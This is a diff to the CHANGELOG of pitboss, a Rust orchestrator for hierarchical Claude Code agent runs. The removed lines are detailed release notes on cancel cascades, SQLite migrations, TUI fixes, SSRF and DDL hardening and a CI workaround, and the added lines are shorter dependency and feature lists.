-  call. The signature is now `Result<Option<Worktree>, WorktreeError>`:
-  `Some(wt)` when the worktree was retained on disk, `None` when it
-  was removed. All in-tree callers (`runner.rs`, `hierarchical.rs`,
-  `mcp/tools.rs`) already discarded the return value via `let _` /
-  `if let Err`, so they continue to compile unchanged. Worktree tests
-  now assert the retained-handle path and that the returned `Worktree`
-  exposes the same `path` and `name` as the input.
-
-- **`SqliteStore`: migration version table** (#149 L11). Replaced the
-  hand-ordered `migrate_*` call sequence in `SqliteStore::new` with a
-  declarative `MIGRATIONS` registry of `(version, name, apply)`
-  triples and a `run_migrations` runner that creates a
-  `schema_versions(version, name, applied_at)` table and skips any
-  version already recorded. Each migration body remains idempotent
-  (column-presence / object-existence checks before any DDL), so DBs
-  in the field that pre-date the version table back-fill all eight
-  rows on the next open with this code, without re-running a
-  successful change. Adding a migration now means appending one entry
-  to `MIGRATIONS` with the next contiguous version number — never
-  reorder or rewrite an existing entry. New tests:
-  `fresh_db_records_all_migration_versions` (every registered
-  migration is recorded); `reopen_is_idempotent_and_preserves_applied_at`
-  (re-open does not re-apply or update timestamps);
-  `legacy_db_backfills_schema_versions` (a DB with the post-migration
-  schema but no `schema_versions` table back-fills cleanly on first
-  open with the new code). Diagnostic accessor
-  `SqliteStore::current_schema_version()` exposes the highest applied
-  version.
-
-### Fixed
-
-- **TUI: async git-diff summary on detail-view open** (#154 M3).
-  `enter_detail_for` previously shelled out to `git diff --shortstat`
-  inline on the UI thread with a 10ms busy-poll loop and a 5s wall-
-  clock timeout — every detail-view open could freeze input for
-  hundreds of ms (or up to 5s on a contended `.git`). The shell-out
-  now runs on a worker thread; the result lands on a new
-  `git_diff_tx` channel and the main event loop drains it into
-  `cached_git_diff` each tick. The diff line in the metadata pane
-  appears one tick (~50 ms) after entering detail rather than
-  blocking the caller. Closes the last open #154 audit item — the
-  issue is now closeable. Pinned by two new state tests:
-  `enter_detail_for_does_not_block_on_diff` (asserts elapsed < 100 ms
-  with a worktree set) and `enter_detail_for_skips_diff_when_no_tx`
-  (asserts no shell-out on the test path with `git_diff_tx = None`).
-
-- **Hierarchical drain: join workers with timeout instead of fixed
-  sleep** (#150 M6+M7). Pre-fix, the dispatcher's shutdown path:
-  (1) terminated root-layer worker tokens directly, (2) called
-  `cancel.terminate()` and relied on the fire-and-forget cascade
-  watchers (`install_cascade_cancel_watcher`,
-  `install_sublead_cancel_watcher`) to fan out to sub-trees, and
-  (3) ran `tokio::time::sleep(TERMINATE_GRACE)` for a fixed 10s
-  before classifying remaining workers as Cancelled. Two
-  consequences: the `tokio::spawn` watchers' scheduling latency
-  could leave sub-tree workers un-signaled past the sleep deadline
-  (M7), and the fixed sleep raced each worker's own
-  SessionHandle SIGTERM→SIGKILL grace (also `TERMINATE_GRACE`) so
-  workers were classified Cancelled while their wait/reap was still
-  in flight (M6). The shutdown path now subscribes to
-  `state.root.done_tx` first, snapshots the in-flight worker set
-  across all layers, then synchronously cascades cancel through the
-  whole tree (`state.cascade_to_subleads()` + each sub-layer's
-  `cascade_to_workers()` + `state.root.cascade_to_workers()`), and
-  finally awaits done events for the snapshot ids with a deadline
-  of `TERMINATE_GRACE + 2s`. New helper
-  `dispatch::hierarchical::await_workers_drained` owns the
-  event-driven wait; lagged-broadcast recovery falls back to a
-  workers-map rescan via `refresh_in_flight_from_maps`. Workers
-  that drain in milliseconds now exit promptly (operator-visible
-  win); workers that genuinely hang past the deadline still get
-  classified Cancelled but the audit's "alive but called
-  Cancelled" race window is closed. Closes the last open #150
-  audit item — the issue is now closeable. Pinned by 5 unit tests
-  in the new `await_drained_tests` module.
-
-- **TUI: don't strand approvals when no control client is attached**
-  (#154 L2). `send_approve` previously called `spawn_control_op`
-  (which silently no-op'd when the client or runtime was missing —
-  observe-only mode, or post-disconnect) and then unconditionally
-  removed the approval from the queue. The operator pressed approve,
-  the actor never received the response, and the request was
-  unreachable from the TUI. The function now gates list mutation on
-  `state.control_client.is_some() && state.runtime_handle.is_some()`
-  (matching the conditions `spawn_control_op` already checks
-  internally) — when those aren't satisfied, the queue is left intact
-  so the operator can retry once a client is attached or dismiss
-  intentionally with Esc. The list-mutation logic is split out as
-  `apply_approve_to_list` so it can be unit-tested without standing
-  up a tokio runtime.
-
-### Changed
-
-- **TUI detail-view scroll: drop dead `DETAIL_VISIBLE_ROWS` constant**
-  (#154 L4). The hard-coded `DETAIL_VISIBLE_ROWS = 40` was passed
-  through to `detail_scroll_down` / `detail_jump_bottom` /
-  `detail_auto_scroll` but those callees already discarded it as
-  `_visible_rows` — the real viewport height comes from
-  `state.detail_log_viewport`, an atomic the renderer publishes from
-  the actual layout-derived inner height each frame. Removing the
-  constant and the unused parameters makes the dynamic source of
-  truth explicit. Operator-visible: jump-to-bottom and auto-follow
-  now lands at the right row regardless of terminal height —
-  pre-fix they appeared correct because the dynamic viewport was
-  always consulted in practice, but the dead `40` literal in the
-  call chain made it look like a sizing bug.
-
-- **TUI: cancel previous bridge-forwarder on SwitchRun** (#154 L1+L3).
-  Each call to `connect_control` previously spawned a tokio task that
-  forwarded events from the per-run `bridge_rx` onto the shared
-  `ctrl_events_tx`, but the OLD task kept running until its read_loop
-  socket closed naturally. Stale events from the prior run could
-  arrive on `ctrl_events_tx` after the explicit drain that follows
-  `reset_state_for_switch`, including ApprovalRequest events that
-  would open a modal whose request_id the new dispatcher cannot ack
-  (#104). The closure now returns the spawned forwarder's
-  `AbortHandle`; SwitchRun aborts the previous one before
-  reconnecting, which closes the bridge channel, causes the
-  read_loop's `events_tx.send()` to fail, and releases the old
-  socket. The drain remains as a backstop for events queued before
-  the abort takes effect.
-
-- **Document four dispatch low-severity contracts** (#150 L11/L12/L15
-  + lifecycle composition). Comment-only changes that close out the
-  docs-shaped tail of the #150 audit: (1) `dispatch/background.rs`
-  now spells out that `--background` and `[lifecycle].survive_parent`
-  are orthogonal mechanisms (operational vs declarative), not
-  alternatives, and can compose; (2) the `current_exe()` call in
-  background dispatch now carries a TOCTOU note explaining why
-  pitboss does not `open()`-then-fexecve the binary; (3) `drop(child)`
-  after the detached spawn is annotated to make explicit that the
-  call uses `std::process::Child` (true no-op drop) rather than
-  `tokio::process::Child` (which has `kill_on_drop` semantics);
-  (4) `dispatch/runner.rs` now documents the cancel-honor contract
-  on `execute_task` and the rationale for the post-semaphore re-check
-  in `spawn_task_loop`. No behavioral changes.
-
-- **`cancel_actor_with_reason` O(N) → O(1) sub-tree-worker routing**
-  (#150). The cancel-with-reason path used to walk every sub-tree's
-  `worker_cancels` map under a held `state.subleads` read lock to
-  find a worker's owning sub-lead — O(N) per cancel call, blocking
-  new sublead registration. Now routes through
-  `state.worker_layer_index` (already populated by
-  `handle_spawn_worker`, mirrors the existing routing in
-  `resolve_layer_for_caller` for KV ops). Same race window as before
-  on the index-set / worker_cancels-set ordering. Fixture-only
-  consequence: tests in `sublead_flows.rs` that bypass
-  `handle_spawn_worker` and inject workers directly into
-  `sub.worker_cancels` now also need to populate
-  `state.worker_layer_index` to match the production invariant —
-  three test cases updated to do so.
-
-- **Consolidate dispatch entry-point boilerplate** (#150 M9). Both
-  `runner::execute` (flat) and `hierarchical::run_hierarchical`
-  inlined ~50 lines each of identical run-id minting, manifest
-  snapshot writes, `RunMeta` init, notification-router build, and
-  `RunDispatched` emit. Past drift between the two copies caused
-  subtle differences (`mode` label, `set_run_subdir` binding) that
-  were easy to miss in code review. Centralized in a new
-  `dispatch/entrypoint.rs` module exposing `init_run_state(...)` (now
-  accepts `run_dir_override` so hierarchical can use it too) and
-  `build_notification_router_and_emit_dispatched(..., mode)` (the
-  `mode: &'static str` parameter is the only point of divergence
-  between the two paths). Hierarchical's `[[lead]]` validation now
-  fires BEFORE `init_run_state` writes anything to disk — pre-#150-M9
-  a no-lead manifest left orphan `manifest.snapshot.toml` and
-  `resolved.json` files on disk; now the bail is fully clean.
-
-- **Decompose `runner::execute` into per-phase functions** (#185). The
-  263-line `dispatch/runner.rs::execute` now reads as five sequential
-  phases: `init_run_state` (mint run id, write manifest snapshots, init
-  `RunMeta`), `print_dry_run_plan` (early-return path), `setup_run_harness`
-  (progress table, semaphore, cancel + Ctrl-C watcher, worktree manager,
-  notification router, flat `DispatchState`, control server),
-  `spawn_task_loop` (per-task `tokio::spawn` + await all), and
-  `finalize_run` (build `RunSummary`, persist, fire `RunFinished`,
-  compute exit code). Bridge state lives on a new `RunHarness` struct
-  for the long-lived references (cancel, store, spawner, etc.); the
-  per-phase-only `records` / `halt_drained` Arcs stay outside the
-  harness so `spawn_task_loop` can `Arc::try_unwrap` the records vec
-  without contending with a harness-held strong ref. No external
-  behavior change: existing `dispatch_flows`, `e2e_flows`, and the
-  full workspace test suite stay green.
-
-- **Extract kill+resume helper** (#185). The kill+resume subprocess
-  loop in `dispatch/hierarchical.rs` (root lead) and
-  `dispatch/sublead.rs` (`spawn_sublead_session` background task) was
-  duplicated — `hierarchical.rs:261`'s own doc-comment said
-  "identical in structure to spawn_sublead_session", and the audit
-  flagged the drift between the two paths as a footgun. Centralized
-  in a new `dispatch/kill_resume.rs` module exposing
-  `run_kill_resume_loop(layer, args, reprompt_rx, build_resume_cmd)`.
-  Each call site keeps ownership of its own resume-args / env / cwd
-  resolution via the closure (root lead and sub-lead use different
-  spawn-args builders); the helper owns the loop, per-iteration cancel
-  forwarder, session_id capture, workers-map updates, and reprompt-
-  driven `--resume` rebuild. Sub-lead cost accumulation moved from
-  per-iteration to once-after-loop (no observable change since no
-  worker spawn into the sub-tree can occur between iterations — the
-  sub-lead's MCP session is closed while its subprocess is dead).
-  Existing integration coverage in `tests/sublead_flows.rs` and
-  `tests/hierarchical_flows.rs` is the regression net.
-
-- **Builder overrides for `TERMINATE_GRACE` / `STREAM_DRAIN_TIMEOUT`**
-  (#149). `SessionHandle` gains `with_terminate_grace(Duration)` and
-  `with_stream_drain_timeout(Duration)` builders. Defaults unchanged
-  (10 s / 30 s, exposed as `pitboss_core::session::TERMINATE_GRACE`
-  and `DEFAULT_STREAM_DRAIN_TIMEOUT`). Tests can drive the cancel /
-  drain windows quickly without monkey-patching globals; future
-  manifest fields could plumb operator-supplied values through the
-  same builders without touching `run_to_completion`.
-
-### Added
-
-- **Resume-failure hint on `FailureReason::Unknown`** (#184). New
-  `pitboss_core::failure_classify::enrich_with_resume_hint(reason,
-  session_id)` augments unhelpful `Unknown` failures from a
-  `--resume`-driven dispatch with an actionable message — names a
-  truncated session id prefix (8 chars, never the full id) and
-  points the operator at "re-run without `--resume` to start fresh,
-  or `pitboss resume <run-id>` against a more recent run." Specific
-  classified reasons (`RateLimit` / `AuthFailure` / `NetworkError` /
-  `ContextExceeded` / `InvalidArgument`) pass through unchanged
-  because their cause is unrelated to the resume. Wired at the three
-  dispatch failure-classification call sites that have a
-  `resume_session_id` in scope: root lead (`hierarchical.rs`), sub-
-  leads (`sublead.rs`), and flat-mode tasks (`runner.rs`). The audit
-  asked for a design call between active validation (ping the API at
-  startup) vs. lazy fail-with-hint; lazy was chosen because pitboss
-  otherwise doesn't talk to the API directly — adding auth plumbing
-  to duplicate what the subprocess already does for a single hint is
-  a poor trade.
-
-### Changed
-
-- **Collapse cancel-cascade watcher tasks; close #100** (#100, PR 100.3).
-  `install_sublead_cancel_watcher` and `install_cascade_cancel_watcher`
-  used to spawn two tasks each (one for drain, one for terminate); now
-  a single `tokio::select!`-based task per watcher waits for the first
-  signal, cascades, and — if the first signal was drain — waits for the
-  follow-up terminate to upgrade drained actors to terminated. Halves
-  the watcher task count and makes the lifecycle visible in one place.
-  New `sublead_watcher_upgrades_drained_workers_to_terminated` unit
-  test pins the upgrade path. ROADMAP entry for #100 updated to
-  reflect that all four audit concerns landed across 100.1–100.3.
-
-- **Centralize cancel-cascade primitive** (#100, PR 100.2). Adds
-  `CancelToken::cascade_to(&CancelToken)` in `pitboss-core` (terminate
-  dominates drain) and threads it through four new methods —
-  `LayerState::register_worker_cancel`, `LayerState::cascade_to_workers`,
-  `DispatchState::register_sublead`, `DispatchState::cascade_to_subleads`.
-  The previously-inlined cascade patterns at `mcp/tools.rs:506-521`
-  (worker registration eager check) and `dispatch/sublead.rs:340-383`
-  (sub-lead spawn insert + watcher install + eager check) now route
-  through these helpers, and the fire-once watcher tasks in
-  `dispatch/signals.rs` funnel through `cascade_to_workers` /
-  `cascade_to_subleads` so the terminate-dominates-drain rule lives in
-  exactly one place. No external behavior change: PR 100.1's
-  `cancel_cascade_flows` integration tests and the existing
-  `signals::tests::sublead_watcher_*` unit tests pin the contract;
-  4 new unit tests on `CancelToken::cascade_to` lock the primitive.
-
-### Tests
-
-- **Pin late-registration cancel-cascade contract** (#100, PR 100.1).
-  Adds `tests/cancel_cascade_flows.rs` covering the eager-propagation
-  paths at `mcp/tools.rs:506-521` (worker registration in a drained
-  sub-tree) and `dispatch/sublead.rs:374-383` (sub-lead spawned after
-  root drain or terminate). Locks the contract before the per-sub-tree
-  runner refactor (PR 100.2) so the cleanup cannot regress the
-  post-#99 behavior. Also pins the production reaping path:
-  terminating a sub-tree removes the sub-lead from `state.subleads`,
-  so subsequent `spawn_worker` calls fail with "unknown sublead_id"
-  rather than reaching the eager-cascade block — flagging the
-  worker-eager-terminate branch as defensive coverage for an
-  intra-handler race not observable through the external MCP API.
-
-### Fixed
-
-- **Notify — write `notifications.jsonl` line before bumping
-  `failed_emits_total`.** `NotificationRouter::dispatch`'s spawned
-  emit-failure path used to increment the counter and then `await` the
-  journal write, so external observers (tests, status APIs) using the
-  counter as a synchronization barrier could read `notifications.jsonl`
-  before the line landed and see ENOENT. Surfaced as flaky CI failures
-  in `router_records_failed_emit_metric_and_journal_line` under
-  slow-FS conditions on GH Actions runners. Swap the order: write the
-  audit-trail line first, then bump the counter. The journal write is
-  bounded and swallows its own errors, so this ordering can't deadlock
-  the spawn.
-
-- **MCP — `wait_for_any` fail-fast on all-unknown task ids,
-  approval-queue-full bridge cleanup, sub-tree `worker_prompts` read**
-  (#151). `handle_wait_for_any` used to subscribe to `done_tx` and
-  block for the full `timeout_secs` (default 3600s) when every passed
-  `task_id` was unknown — typo, evicted, never spawned — waking only
-  on unrelated broadcasts; now scans every layer first and fails fast
-  with a diagnostic naming the unknown ids when none resolve.
-  `request_approval` used to log a warning and silently leave the
-  bridge entry alive when the control writer's send queue was full,
-  so the caller blocked the full bridge timeout for an event the TUI
-  would never see; now evicts the bridge entry on `try_send` failure
-  and routes through the policy fallback (`AutoApprove` → approved,
-  `AutoReject`/`Block` → rejected with diagnostic). And
-  `handle_worker_status` used to read `prompt_preview` only from
-  `state.root.worker_prompts`, so sub-lead-spawned workers (whose
-  prompts live in their layer's prompts map) returned an empty
-  preview — fixed by routing through `layer_for_worker(state,
-  task_id)` with a root fallback.
-
-- **TUI — `connect_control` 200 ms timeout, `ApprovalModal` dismissal
-  on disconnect, `q`→Quit in modal modes, mouse hit-rect poison
-  recovery** (#154). The blocking
-  `runtime.block_on(ControlClient::connect(...))` on the main UI
-  thread used to stall the 50 ms input loop on a slow dispatcher
-  accept; now wrapped in `tokio::time::timeout(200ms, ...)` — worst
-  case the client comes back as `None` and the operator sees the
-  "no control" status, same UX as before but bounded.
-  `Superseded`/`RunFinished` now drop back to `Mode::Normal` if a
-  modal is open so the operator isn't stranded submitting approvals
-  into a disconnected client. `q` now respects the global Quit
-  shortcut in `ApprovalModal::Overview` and `PolicyEditor` (the
-  draft-typing sub-modes still consume `q` so it can appear in
-  rejection reasons). And the picker / tile / Completed-tab mouse
-  hit-test now poison-recovers via
-  `lock().unwrap_or_else(PoisonError::into_inner)` instead of
-  `lock().ok()?`, so a single panic doesn't permanently disable
-  mouse navigation for the session — the cache is rebuilt every
-  frame so recovery is safe.
-
-- **Background dispatch hardening — pre-flight manifest validation,
-  path canonicalization, captured stderr, EPIPE-safe announcement,
-  strict UUID v7** (#150). `pitboss dispatch --background` used to
-  detach without parsing the manifest and silently nulled the child's
-  stderr, so a TOML syntax error or panic in startup left zero
-  diagnostic; now validates the manifest on the parent before
-  spawning, canonicalizes `manifest_path` and `--run-dir` so the
-  JSON announcement is self-contained, and redirects child stderr
-  to `<runs_base>/<run_id>.bg-stderr.log` (returned in the
-  announcement under `bg_stderr_log`). The announcement uses
-  `writeln!` on a locked stdout instead of `println!` — an
-  orchestrator that closes its end of the pipe before reading
-  the announcement no longer panics the parent with EPIPE.
-  `parse_internal_run_id` rejects non-v7 UUIDs (pitboss extracts a
-  millisecond timestamp from v7's leading bytes; a v4 silently
-  broke every consumer that relied on that). Plus
-  `install_ctrl_c_watcher` is now idempotent via a static
-  `AtomicBool`, and `halt_drained` switched from
-  `Ordering::Relaxed` to `Release`/`Acquire` to make the
-  store/load synchronization explicit. Lead worktree cleanup
-  failures now log at `warn` with a pointer to `pitboss prune`
-  instead of being swallowed with `let _ =`.
-
-- **`pitboss-core` session — fire `session_id` on `init` event, not
-  on terminal `Result`; switch `accum` to `std::sync::Mutex`**
-  (#149 M5/L7). The dispatcher's `session_id_tx` channel notified
-  on the terminal `Event::Result` instead of the `system{init}`
-  event Claude Code emits at second one, so the dispatcher waited
-  the full run duration (30+ minutes for long leads) for a session
-  id it could have had immediately. Added an `Option<String>
-  session_id` field to `Event::System` and the parser populates it;
-  the stream loop fires the channel on init, with the result-event
-  path kept as a fallback for older claude builds that don't carry
-  session_id on init. The previous test
-  (`session_id_fires_on_init_event`) was misleading — emitted both
-  an init AND a result line, so the channel firing on result
-  satisfied the assertion even though init was ignored; replaced
-  with two tests (init-only, result-fallback). The `accum`
-  accumulator switched from `tokio::sync::Mutex` to
-  `std::sync::Mutex` because no suspension point is held across
-  the lock; lock-acquire now poison-recovers via
-  `PoisonError::into_inner`.
-
-- **`pitboss-core` store — env persistence parity, typed error
-  variants, DDL identifier hardening** (#149 M2/L9/L10).
-  `RunMeta.env` HashMap was silently dropped on the `SQLite`
-  backend (no `env` column) while `JsonFileStore` round-tripped it
-  through `meta.json`; added an `env_json TEXT NULL` column and a
-  `migrate_runs_env` migration with an empty-NULL optimization for
-  the common case. `StoreError` gained typed `Busy`, `Schema`, and
-  `Sqlite` variants alongside the existing catch-all `Incomplete`,
-  with a `from_rusqlite(&err)` classifier that maps
-  `SQLITE_BUSY`/`SQLITE_LOCKED` to `Busy`, schema-mismatch error
-  text to `Schema`, and the rest to `Sqlite` — callers can now
-  distinguish retryable from operator-action-required from generic
-  storage errors without parsing strings. The
-  `migrate_v04_event_counters` DDL `format!`-interpolation pattern
-  was lifted into `add_column_if_missing(table, column,
-  type_clause)` which uses a *bound* parameter for the existence
-  check and runs the column/table identifier through
-  `assert_safe_ident` before inlining into the `ALTER TABLE` —
-  closes the only DDL footgun in the file.
-
-- **`pitboss-core::failure_classify` module + libgit2 worktree
-  cache + `SessionStore::open`** (#188). Moved `classify`,
-  `match_*`, `parse_reset_timestamp` / `parse_12h_time` /
-  `month_from_abbrev`, and `excerpt` from
-  `pitboss-cli::dispatch::failure_detection` into a new
-  `pitboss_core::failure_classify` module so downstream consumers
-  (the `pitboss-web` console, future external integrations) can
-  classify a log blob without depending on the CLI crate;
-  `FailureReason` already lived here, the constructor now lives
-  next to it. The rate-limit warn-on-parse-failure behavior added
-  in #194 moved with it. The `prepare` branch-conflict pre-check
-  used to call `Repository::open(wt.path())` per existing worktree,
-  dominating prepare time on operators with heavy worktree usage;
-  the new `head_branch_for_worktree` reads the worktree's
-  plain-text HEAD file (`<repo>/.git/worktrees/<name>/HEAD`)
-  directly, with `head_branch_via_open` as a fallback for
-  detached-HEAD or unusual layouts. Added
-  `SessionStore::open(path: &Path) -> Result<Box<dyn SessionStore>,
-  StoreError>` so callers can uniformly construct either backend
-  through the trait — pre-fix `SqliteStore::new` was fallible and
-  `JsonFileStore::new` was infallible.
-
-- **`TokenUsage::add` saturating semantics** (#185 low). Switched
-  from unchecked `+=` to `saturating_add` and emits a
-  `tracing::warn!` if any field saturates at `u64::MAX`.
-  Practically unreachable, but the dispatcher accumulates
-  `total_token_usage` across kill+resume iterations of long-running
-  leads with no per-iteration cap; the saturation guard makes
-  overflow impossible rather than merely improbable.
-
-- **`shared_store::LeaseRegistryApi` trait for the cleanup hook**
-  (#189). Pitboss has two lease registries with deliberately
-  divergent semantics — `leases::LeaseRegistry` (per-KvStore-layer,
-  MCP-tool-mediated, `lease_id`-keyed, no same-holder renewal) and
-  `run_leases::LeaseRegistry` (run-global, `(key, holder)`-keyed,
-  with same-holder renewal and blocking `acquire_with_wait`).
-  Migrating a usage between them used to lose semantics silently
-  with no compile-time signal. The new `LeaseRegistryApi` trait
-  covers *only* the operation that *is* identical in both — the
-  cleanup hook fired on MCP connection drop and cancel cascade —
-  so call sites that only need cleanup can be parameterized over
-  `&dyn LeaseRegistryApi` and a future third registry must
-  implement cleanup before being wireable.
-
-- **Notify — poison-recover dedup mutex; document SSRF TOCTOU
-  mitigation** (#187). The `dedup_cache: Mutex<LruCache<...>>` in
-  `NotificationRouter::dispatch` used `.lock().unwrap()`; a panic
-  in any code path holding the guard would propagate `PoisonError`
-  to every subsequent dispatch and silently disable all
-  notifications — fixed by recovering the inner cache on poison
-  (worst case: one duplicate emit). The original audit also
-  flagged a DNS-rebinding TOCTOU between `pre_request_ssrf_check`
-  and `build_pinned_client`, but inspection of current code shows
-  the mitigation is already in place: `pre_request_ssrf_check`
-  performs a *single* DNS resolution and returns the validated
-  `Vec<SocketAddr>`, which the sink hands to
-  `reqwest::ClientBuilder::resolve_to_addrs` (a static override,
-  not a second lookup). Added a regression test
-  (`pinned_client_addrs_match_preflight_addrs_exactly`) that locks
-  in the single-resolution invariant.
-
-- **CLI — consolidated run-id prefix resolver** (#184). `pitboss
-  attach`, `status`, `resume`, and `diff` each carried a
-  near-identical `resolve_run_dir` / `resolve_run_under`
-  implementation, and the four had drifted: only `diff` did
-  exact-match-first, and the ambiguous-prefix diagnostic wording
-  differed across copies. Lifted a single
-  `runs::resolve_run_dir_by_prefix(base, id_or_prefix)`: exact-
-  directory match first, then prefix scan, with the canonical
-  "`{n}` runs match prefix '...' — be more specific" diagnostic.
-  All four call sites delegate.
-
-- **Rate-limit `resets_at` parse failures now log a `warn!`** (#185).
-  `match_rate_limit` previously called `parse_reset_timestamp` and
-  silently returned `RateLimit { resets_at: None }` on any parse failure.
-  `ApiHealth::check_can_spawn` would then fall back to
-  `RATE_LIMIT_DEFAULT_BACKOFF_SECS = 300s` with no log line, leaving
-  operators with "rate limited, retrying in 5 minutes" and no clue that
-  the actual reset was 30 seconds away. Emit a `tracing::warn!` carrying
-  a `raw_excerpt` (the substring around `"resets …"`, or a tail when
-  the marker is absent) and the `default_backoff_secs` value so the
-  fallback is observable. The `RateLimit` classification itself is
-  unchanged. Three regression tests cover (1) malformed `resets …`
-  payloads, (2) markers without a `resets ` clause at all, and
-  (3) the happy path still doesn't emit the warn.
-
-- **Web console socket-path resolution.** `ControlBridge::dial` previously
-  hardcoded the socket lookup to `<runs_dir>/<run_id>/control.sock`, but
-  the dispatcher publishes its control socket at
-  `$XDG_RUNTIME_DIR/pitboss/<run_id>.control.sock`. The web console
-  therefore couldn't dial live runs in the standard install layout.
-  Mirrors `pitboss_cli::runs::resolve_socket_path` (XDG-first, in-run-dir
-  fallback). A future refactor should expose the CLI's resolver so both
-  surfaces share it.
-
-- **Consolidated depth-2 invariant enforcement** (#184). Pitboss caps the
-  actor hierarchy at root lead → sub-leads → workers; only the root lead
-  can call `spawn_sublead`. The cap was enforced at four independent
-  sites (CLI `--allowedTools`, MCP `list_tools` filter, manifest
-  capability check, caller-role check) with no shared rule, so adding a
-  new root-only tool risked missing a layer silently. Introduced a new
-  `dispatch::depth` module owning the rules: `ROOT_ONLY_TOOLS` is the
-  single source of truth, with `is_root_only_tool`,
-  `validate_spawn_sublead_caller`, and `validate_spawn_sublead_capability`
-  as the consolidated checks. The MCP `list_tools` filter, the
-  `spawn_sublead` handler's manifest gate, and the role check
-  (`extract_and_check_root_lead`) all route through it. A new regression
-  test (`sublead_allowlist_excludes_all_root_only_tools`) cross-checks
-  that `SUBLEAD_MCP_TOOLS` and the root-only allowlist stay disjoint by
-  construction — a future contributor adding a root-only tool only needs
-  to append to `ROOT_ONLY_TOOLS`; the rest follows automatically.
-
-- **Manifest snapshot durability — typed schema-version mismatch + alias
-  regression test** (#186). `ResolvedManifest` now carries a
-  `manifest_schema_version: u32` (current = `1`) that's serialized into
-  every `resolved.json` snapshot. The resume loader (`build_resume_manifest`,
-  `build_resume_hierarchical`) refuses to deserialize a snapshot whose
-  version exceeds what this build supports, surfacing a typed
-  `ManifestError::IncompatibleVersion { found, supported }` instead of
-  an opaque serde failure when an older pitboss tries to resume a run
-  produced by a newer one. Pre-versioning snapshots (the v0.9.0/v0.9.1
-  era, where the field is absent) default to `0` and remain resumable
-  on a best-effort basis. Bumps to `CURRENT_MANIFEST_SCHEMA_VERSION` are
-  reserved for breaking changes that `#[serde(alias)]` cannot cover.
-  A new test (`resolved_manifest_accepts_legacy_serde_aliases`) locks
-  in deserialization of every renamed field's pre-v0.9 JSON name —
-  if a future rename drops its alias, the test breaks loudly.
-
-- **Crash-safe writes for `summary.json` and `meta.json`** (#184, #188).
-  An interrupt mid-write (`SIGKILL`, OOM, host crash) could previously
-  produce a partial or truncated final file. All three call sites now
-  use a new `pitboss_core::atomic_write` helper that writes to a
-  sibling `.tmp`, `fsync`s, and atomically `rename`s onto the
-  destination. Callers affected: `JsonFileStore::finalize_run` and
-  `JsonFileStore::init_run` in `pitboss-core`, and
-  `pitboss prune --apply --synthesize`'s `synthesize_summary` in
-  `pitboss-cli`. The destination either reflects the prior contents or
-  the full new contents, never a half-flushed mix.
 
 ## [0.9.1] — 2026-04-27
 
-Republishes the v0.9.0 platform artifacts after a release-pipeline fix.
-v0.9.0's tag and code shipped fine — container images, docs site, and
-Homebrew tap update were unaffected — but the cargo-dist `release.yml`
-plan-step output was rejected by GHA's secret-scanning heuristic
-(introduced 2025), which silently skipped every build matrix job. The
-v0.9.0 GitHub Release was created with only `dist-manifest.json`
-attached, so nothing on the [releases page](https://github.com/SDS-Mode/pitboss/releases)
-was actually installable via the shell installer or direct tarball
-download. **There are no functional changes in v0.9.1 vs v0.9.0** —
-upgrade only if you tried to install v0.9.0 from tarball/installer
-and hit the missing artifacts.
+### Dependencies
 
-### Fixed
+- Bump git2 from 0.19.0 to 0.20.4 ([#181](https://github.com/SDS-Mode/pitboss/pull/181))
+- Bump toml from 0.8.23 to 1.1.2+spec-1.1.0 ([#174](https://github.com/SDS-Mode/pitboss/pull/174))
+- Bump crossterm from 0.28.1 to 0.29.0 ([#179](https://github.com/SDS-Mode/pitboss/pull/179))
+- Bump thiserror from 1.0.69 to 2.0.18 ([#175](https://github.com/SDS-Mode/pitboss/pull/175))
 
-- **`release.yml`: strip free-form prose from `plan` step output.** The
-  cargo-dist plan manifest's `announcement_changelog`,
-  `announcement_github_body`, and `announcement_title` fields are
-  removed from the GHA step output (`needs.plan.outputs.val`) before
-  downstream gates evaluate. The full manifest is preserved as the
-  `artifacts-plan-dist-manifest` artifact for any consumer that needs
-  it, and the `announce` job re-derives prose from a fresh
-  `dist host --steps=announce` call. Stripping is required because
-  GHA's secret-scanner started flagging long prose blobs as "may
-  contain secret" and silently skipping the output, which made
-  `fromJson(needs.plan.outputs.val).ci.github.artifacts_matrix` null
-  and bypassed the build matrix entirely. This is a structural
-  workaround — cargo-dist 0.32+ moves to artifact-based plan
-  distribution and should obsolete it.
 
 ## [0.9.0] — 2026-04-27
 
-The web operational console release. Pitboss now ships a single-binary
-HTTP server (`pitboss-web`) with an embedded SvelteKit SPA that gives
-the dispatcher a full browser surface — read every run's filesystem
-artefacts, drive live runs through their control sockets, author and
-import manifests via a guided wizard, and track failure patterns
-across runs with a Drain-lite clustering dashboard. The TUI and the
-web console are now first-class peers against the same
-`~/.local/share/pitboss/runs` directory.
+### Added
 
-Highlights:
-- **Web operational console (Phases 1–5 + tile grid + flow graph).**
-  Read endpoints, SSE event stream, control writes (cancel / pause /
-  reprompt / approve), manifest authoring, dispatch from browser, fork
-  from completed runs.
-- **Manifests wizard.** 5-step Guided / Import / Export flow on
-  `/manifests`, with hover tooltips sourced from the canonical
-  `FieldDescriptor.help` strings — single source of truth with the
-  schema docs.
-- **Cross-run insights + Drain-lite failure clustering.** New
-  `/insights/failures` dashboard with ECharts bar + heatmap, top
-  clusters with template-pill rendering, manifest-health rollup. New
-  `[run].name` field surfaces a human-readable label for grouping
-  related runs.
-- **macOS-aware runs_base_dir.** TUI, CLI, and web console now share a
-  default base on macOS without operators having to pass `--runs-dir`.
+- Pitboss-web operational console — Phases 1–5 + tile grid + flow graph + Slice A insights + manifests wizard ([#169](https://github.com/SDS-Mode/pitboss/pull/169))
+- Pitboss dispatch --background for non-blocking dispatch (#133-C) ([#138](https://github.com/SDS-Mode/pitboss/pull/138))
+- [lifecycle] section + survive_parent (#133-A) ([#137](https://github.com/SDS-Mode/pitboss/pull/137))
+- Pitboss list [--active] [--json] (#133-B) ([#136](https://github.com/SDS-Mode/pitboss/pull/136))
+- Parent-orchestrator notify hook ([#135](https://github.com/SDS-Mode/pitboss/pull/135))
+- Expose untruncated final assistant message ([#134](https://github.com/SDS-Mode/pitboss/pull/134))
+- Pitboss tree pre-flight subcommand + cost gate ([#132](https://github.com/SDS-Mode/pitboss/pull/132))
+- Pitboss prune — sweep orphaned run directories ([#131](https://github.com/SDS-Mode/pitboss/pull/131))
+- Stale state + connect-based liveness probe ([#130](https://github.com/SDS-Mode/pitboss/pull/130))
+- Pitboss init [output] [-t simple|full] [--force] ([#129](https://github.com/SDS-Mode/pitboss/pull/129))
+- Pitboss schema --format=example + docs/manifest-reference.toml ([#128](https://github.com/SDS-Mode/pitboss/pull/128))
